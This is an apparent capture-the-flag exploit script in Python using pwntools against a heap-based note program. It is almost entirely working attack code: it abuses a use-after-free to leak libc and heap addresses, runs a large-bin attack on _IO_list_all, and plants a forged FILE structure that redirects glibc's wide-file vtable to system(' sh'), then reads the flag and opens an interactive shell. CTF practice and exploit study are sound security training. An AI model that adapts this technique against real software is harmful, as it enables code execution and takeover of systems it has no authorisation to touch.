#!/usr/bin/env python3

import os
import signal

from pwn import *

exe = ELF("./prob_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe


if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("addr", 1337)

def GDB():
    if args.GDB:
        gdb.attach(p, gdbscript='''
            #edit
            brva 0x194F

            #add
            brva 0x166C
            brva 0x16D9
            c
            set follow-fork-mode parent
            ''')

def choice(opt):
    p.sendlineafter(b'Choice: ', str(opt).encode())

def add(idx, size, data):
    choice(1)
    p.sendlineafter(b'Index (0-6): ', str(idx).encode())
    p.sendlineafter(b'Size (1-4096): ', str(size).encode())
    p.sendafter(b'Content: ', data)
def show(idx):
    choice(2)
    p.sendlineafter(b'Index (0-6): ', str(idx).encode())
def edit(idx, data):
    choice(3)
    p.sendlineafter(b'Index (0-6): ', str(idx).encode())
    p.sendafter(b'New content: ', data)
def delete(idx):
    choice(4)
    p.sendlineafter(b'Index (0-6): ', str(idx).encode())


add(0, 0x428, b'1'*0x428) #0
add(1, 0x18, b'2'*0x18) #1
add(2, 0x418, b'3'*0x418) #2
add(3, 0x18, b'3'*0x18) #3


delete(0)

show(0)
p.recvuntil(b'Note[0]: ')
libc_base = u64(p.recv(8))-0x203b20
io_list_all = libc_base + libc.sym['_IO_list_all']
stdout = libc_base + libc.sym['_IO_2_1_stdout_']
print("libc_base: "+hex(libc_base))
print("io_list_all: "+hex(io_list_all))
print("stdout: "+hex(stdout))


add(4, 0x438, b'1'*0x438) #4
delete(2)


show(0)
p.recvuntil(b'Note[0]: ')
p.recv(0x10)
heap_base = (u64(p.recv(8))) - 0x290
print("heap_base: "+hex(heap_base))

tmp = libc_base + 0x203f10
fake_file = heap_base + 0x6e0
target = io_list_all - 0x20

GDB()
payload = p64(tmp) * 2 + p64(fake_file) + p64(target)
payload = payload.ljust(0x428, b'\0')
edit(0, payload)

add(5, 0x438, b'1'*0x438) #5

edit(1, b'A' * 0x10 + b' sh\x00\x00\x00\x00\x00')

lock = fake_file + 0x240
fake_io = flat({
    0x08: p64(0),
    0x10: p64(0),
    0x18: p64(1),
    0x20: p64(0),
    0x58: p64(libc_base + libc.sym["system"]),
    0x78: p64(lock),
    0x90: p64(fake_file),
    0xB0: p64(0),
    0xC8: p64(libc_base + libc.sym["_IO_wfile_jumps"]),
    0xD0: p64(fake_file),
}, filler=b"\x00")
fake_io = fake_io.ljust(0x418, b"\x00")
edit(2, fake_io)

p.recvuntil(b'Choice: ')

if args.LOCAL:
    os.kill(p.pid, signal.SIGSEGV)
    p.recvuntil(b'Segmentation fault occurred\n')
else:
    delete(0)

p.sendline(b"cat flag")
print(p.recvline(timeout=2))
p.interactive()
#0x2815c8
"""
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

"""
